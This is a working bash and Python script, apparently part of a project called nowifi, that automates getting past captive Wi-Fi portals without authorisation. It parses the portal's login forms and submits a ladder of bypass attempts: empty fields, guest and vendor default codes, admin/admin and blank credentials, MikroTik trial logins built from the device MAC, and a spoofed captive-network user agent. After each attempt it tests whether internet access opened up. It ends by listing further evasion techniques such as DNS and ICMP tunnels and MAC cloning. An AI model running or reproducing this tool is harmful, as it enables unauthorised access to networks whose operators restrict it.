#!/data/data/com.termux/files/usr/bin/bash
# scripts/portal-hit.sh
#
# No-root click-through engine, the part of nowifi that does not need an
# interface, a tunnel server or sudo. It runs from Termux with curl + python3,
# from the same IP as your browser, so nothing is limited by CORS.
#
# It does exactly two things, and refuses to pretend otherwise:
#   1. pulls the portal page and extracts every real <form> (action, method,
#      hidden fields preserved),
#   2. fires an ordered payload ladder at those forms and re-tests egress after
#      each shot. The verdict comes from the egress probe, never from the
#      portal's own "success" page (portals lie; the gateway does not).
#
# usage: portal-hit.sh <portal-url> [egress-url]
#        egress-url defaults to the Android connectivity check
#        (expects 204 = internet, anything else = still walled).
# env:   PORTAL_MAC   your device MAC (aa:bb:cc:dd:ee:ff). Needed only for
#                     MikroTik trial-login attempts (username T-<MAC>).
#                     Android 10+ gives apps 02:00:00:00:00:00; read the real
#                     one from Settings > Wi-Fi > (network) > Privacy. If unset,
#                     the trial attempts are skipped, not faked.
set -uo pipefail

PORTAL="${1:-}"
EGRESS="${2:-http://connectivitycheck.gstatic.com/generate_204}"
UA_BROWSER='Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
UA_CNA='Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CaptiveNetworkSupport/1.0 wispr'
MAC="${PORTAL_MAC:-}"
# termux-api can supply one, but on Android 10+ it is redacted to
# 02:00:00:00:00:00, which is useless as a credential.
if [ -z "$MAC" ] && command -v termux-wifi-connectioninfo >/dev/null 2>&1; then
  cand="$(timeout 8 termux-wifi-connectioninfo 2>/dev/null | sed -n 's/.*"mac_address": *"\([^"]*\)".*/\1/p')"
  case "$cand" in 02:00:00:00:00:00|"") : ;; *) MAC="$cand" ;; esac
fi

if [ -z "$PORTAL" ]; then
  echo "usage: portal-hit.sh <portal-url> [egress-url]" >&2
  exit 2
fi

command -v curl >/dev/null || { echo "curl missing" >&2; exit 2; }
command -v python3 >/dev/null || { echo "python3 missing" >&2; exit 2; }

WORK="$(mktemp -d 2>/dev/null || echo "$HOME/tmp/portal-hit.$$")"
mkdir -p "$WORK"
JAR="$WORK/cookies.txt"
PAGE="$WORK/portal.html"
trap 'rm -rf "$WORK"' EXIT

# egress: 204 -> internet, anything else -> walled. No -L: following a portal
# redirect would turn its login page into a green light.
egress() {
  local code
  code="$(curl -s -o /dev/null -m 8 -w '%{http_code}' "$EGRESS")"
  if [ "$code" = "204" ]; then echo "OPEN"; else echo "WALLED(${code:-000})"; fi
}

echo "== portal-hit ==============================================================="
echo "portal : $PORTAL"
echo "egress : $EGRESS"
BEFORE="$(egress)"
echo "state  : $BEFORE"
if [ "$BEFORE" = "OPEN" ]; then
  echo "Already online. Nothing to grant. (If you wanted this to prove a bypass, you"
  echo "are reading the wrong box: there is no portal on this network right now.)"
  exit 0
fi

echo
echo "-- fetch portal -------------------------------------------------------------"
curl -sSL -m 15 -c "$JAR" -b "$JAR" -A "$UA_BROWSER" -o "$PAGE" -w 'http=%{http_code} bytes=%{size_download}\n' "$PORTAL" || true
if [ ! -s "$PAGE" ]; then
  echo "portal page empty; wrong URL, or the gateway will not talk to curl." >&2
  exit 1
fi

echo
echo "-- attempts -----------------------------------------------------------------"
# python3 emits TSV: idx <TAB> method <TAB> action <TAB> payload <TAB> label
python3 - "$PAGE" "$PORTAL" "$UA_BROWSER" "$UA_CNA" "$MAC" <<'PY' > "$WORK/attempts.tsv"
import sys
from html.parser import HTMLParser
from urllib.parse import urljoin

page, base = sys.argv[1], sys.argv[2]
UA_BROWSER, UA_CNA, MAC = sys.argv[3], sys.argv[4], sys.argv[5]
html = open(page, 'r', errors='replace').read()

class Forms(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.forms, self.cur = [], None
    def handle_starttag(self, tag, attrs):
        a = {k.lower(): (v or '') for k, v in attrs}
        if tag == 'form':
            self.cur = {'action': a.get('action', ''), 'method': (a.get('method') or 'get').lower(), 'fields': []}
            self.forms.append(self.cur)
        elif self.cur is not None and tag in ('input', 'textarea', 'select'):
            name = a.get('name') or ''
            if not name:
                return
            typ = (a.get('type') or 'text').lower()
            self.cur['fields'].append({'name': name, 'type': typ, 'value': a.get('value', '')})
    def handle_endtag(self, tag):
        if tag == 'form':
            self.cur = None

p = Forms(); p.feed(html)
forms = [f for f in p.forms if f['fields']]

# Portals that only check in JS still carry the fields in the DOM; portals that
# enforce server-side carry the same fields and will refuse. We cannot tell them
# apart statically, so we try both orders and let egress decide.
DEFAULTS = {'user': 'guest', 'username': 'guest', 'email': 'guest@example.com',
            'password': 'guest', 'pass': 'guest', 'code': '0000', 'room': '101',
            'voucher': '0000', 'pin': '0000'}
CHECKBOX_ON = ('on', '1', 'true', 'yes')

rows, seen = [], set()
idx = 0
for f in forms:
    action = urljoin(base, f['action'] or base)
    method = 'POST' if f['method'] == 'post' else 'GET'
    base_fields = [(x['name'], x['value']) for x in f['fields'] if x['type'] == 'hidden']

    mac_l = MAC.lower()
    mac_d = mac_l.replace(':', '-')
    CREDS = {
        'blank':  ('', ''),
        'admin':  ('admin', 'admin'),
        'adminp': ('admin', ''),
        'trial':  ('T-%s' % mac_d, mac_l),
        'triald': ('T-%s' % mac_d, mac_d),
        'trialnp': ('T-%s' % mac_d, ''),
    }

    def payload(mode):
        out = list(base_fields)
        if mode in CREDS:
            user, pw = CREDS[mode]
            for x in f['fields']:
                n = x['name'].lower()
                if n in ('username', 'user', 'login'):
                    out.append((x['name'], user))
                elif n in ('password', 'pass', 'passwd'):
                    out.append((x['name'], pw))
                elif x['type'] in ('checkbox', 'radio'):
                    out.append((x['name'], CHECKBOX_ON[0]))
                elif x['type'] == 'submit':
                    out.append((x['name'], x['value'] or 'Continue'))
            return out
        for x in f['fields']:
            if x['type'] == 'hidden':
                continue
            n = x['name']
            if x['type'] in ('checkbox', 'radio'):
                if mode != 'minimal':
                    out.append((n, CHECKBOX_ON[0]))
            elif x['type'] == 'submit':
                out.append((n, x['value'] or 'Continue'))
            elif mode == 'minimal':
                out.append((n, ''))
            elif mode == 'guest':
                out.append((n, DEFAULTS.get(n.lower(), 'guest@example.com' if 'mail' in n.lower() else 'guest')))
            elif mode == 'defaults':
                out.append((n, DEFAULTS.get(n.lower(), x['value'] or 'guest')))
        return out

    names = {x['name'].lower() for x in f['fields']}
    has_cred = bool(names & {'username', 'user', 'login', 'password', 'pass', 'passwd'})
    ladder = [
        ('minimal',  'fields empty (client-side-only validation)', UA_BROWSER),
        ('guest',    'guest credentials', UA_BROWSER),
        ('defaults', 'vendor default codes + accept', UA_BROWSER),
        ('guest',    'CNA/WISPr User-Agent spoof', UA_CNA),
    ]
    if has_cred:
        ladder += [
            ('blank',  'empty username + empty password', UA_BROWSER),
            ('admin',  'admin / admin', UA_BROWSER),
            ('adminp', 'admin / empty password', UA_BROWSER),
        ]
        if MAC:
            ladder += [
                ('trial',  'MikroTik trial login T-<MAC> / <MAC> (%s)' % MAC, UA_BROWSER),
                ('triald', 'MikroTik trial login T-<MAC> / dashed MAC', UA_BROWSER),
                ('trialnp', 'MikroTik trial login T-<MAC> / empty password', UA_BROWSER),
            ]

    if '/login' in action and not (names & {'username', 'user', 'login'}):
        for mode, label, ua in (('blank', 'blind /login: empty user+pass', UA_BROWSER),
                                ('admin', 'blind /login: admin/admin', UA_BROWSER)):
            pairs = list(base_fields) + [('username', CREDS[mode][0]), ('password', CREDS[mode][1])]
            key = (method, action, tuple(pairs), ua)
            if key in seen:
                continue
            seen.add(key)
            idx += 1
            rows.append((idx, method, action, '&'.join('%s=%s' % kv for kv in pairs), label, ua))

    for mode, label, ua in ladder:
        pairs = payload(mode)
        # de-dup on the exact request shape
        key = (method, action, tuple(pairs), ua)
        if key in seen:
            continue
        seen.add(key)
        idx += 1
        body = '&'.join(f'{k}={v}' for k, v in pairs)
        rows.append((idx, method, action, body, label, ua))

for r in rows:
    print('\t'.join(str(x) for x in r))

if not rows:
    print('#NOFORMS\t\t\t\t\t', end='')
PY

if [ ! -s "$WORK/attempts.tsv" ]; then
  echo "form parser produced nothing (python error). Nothing was fired." >&2
  exit 3
fi

if grep -q '^#NOFORMS' "$WORK/attempts.tsv" 2>/dev/null; then
  echo "no <form> with named fields found. The portal is JS-driven (SPA): there is"
  echo "nothing to replay. Use bypass.html -> 'copy as curl' after filling the real"
  echo "form, or run the detection rungs; technique #4 needs the API path, not a form."
fi

GRANTED=0
COUNT=0
while IFS=$'\t' read -r idx method action body label ua; do
  [ -z "${idx:-}" ] && continue
  case "$idx" in \#*) continue;; esac
  COUNT=$((COUNT + 1))
  if [ "$method" = "POST" ]; then
    code="$(curl -s -o /dev/null -m 12 -c "$JAR" -b "$JAR" -A "$ua" \
            -H 'Content-Type: application/x-www-form-urlencoded' \
            -e "$PORTAL" -w '%{http_code}' --data "$body" "$action" || echo 000)"
  else
    code="$(curl -s -o /dev/null -m 12 -c "$JAR" -b "$JAR" -A "$ua" -e "$PORTAL" \
            -w '%{http_code}' "$action?$body" || echo 000)"
  fi
  sleep 1
  state="$(egress)"
  printf '%2s  %-4s %-6s egress=%-11s %s\n' "$idx" "$method" "${code:-000}" "$state" "$label"
  if [ "$state" = "OPEN" ]; then
    GRANTED=1
    echo "    ^^^ granted by attempt $idx"
    break
  fi
done < "$WORK/attempts.tsv"

echo
echo "-- verdict ------------------------------------------------------------------"
if [ "$GRANTED" = "1" ]; then
  echo "GRANTED. The gateway now lets $EGRESS through for this device's IP."
  echo "Nothing was parsed, cracked or tunnelled: the portal accepted a request it"
  echo "should have refused. Next: point the browser through your relay if you"
  echo "still need it, otherwise just browse."
  exit 0
fi

echo "NOT GRANTED after $COUNT attempt(s). The portal enforces auth server-side."
echo "That is a real answer, not a failure of the tool: the rungs that could still"
echo "work need root or a server you do not have on this device:"
echo "  #1 IPv6 bypass (RA/DHCPv6 unfiltered)      - needs interface control"
echo "  #2/#5/#29 tunnels (WS/H2 CONNECT)          - need a tunnel server"
echo "  #6/#7/#14 MAC clone / rotate               - needs NET_ADMIN"
echo "  #8 ICMP, #9/#10 DNS/53, #18 NTP tunnels    - need raw sockets"
echo "  #15 DHCP rotate, #23 option-121, #26 alt iface - need NET_ADMIN"
echo "  #24 ECH fronting, #27 MASQUE, #28 WebT                - need a server + QUIC control"
echo "Open bypass.html for the browser-side rungs (detection, relay reachability,"
echo "and the JS-only portal analysis that a form replay cannot see)."
exit 1
